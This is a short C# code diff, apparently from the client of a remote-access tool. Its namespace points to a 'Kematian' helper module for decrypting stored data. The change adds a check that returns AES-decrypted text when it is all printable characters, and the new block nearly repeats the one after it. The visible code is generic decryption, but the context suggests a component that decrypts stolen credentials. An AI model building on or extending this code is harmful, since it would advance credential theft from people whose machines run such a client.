@@ -275,7 +275,19 @@ namespace Pulsar.Client.Kematian.HelpingMethods.Decryption
                             using (ICryptoTransform decryptor = aes.CreateDecryptor())
                             {
                                 byte[] decrypted = decryptor.TransformFinalBlock(encData, 0, encData.Length);
-                                
+
+                                try
+                                {
+                                    string result = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
+                                    if (result.Length > 0 && result.All(c => c >= 32 && c <= 126))
+                                    {
+                                        return result;
+                                    }
+                                }
+                                catch
+                                { 
+                                    return "";
+                                }
                                 try
                                 {
                                     string result = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
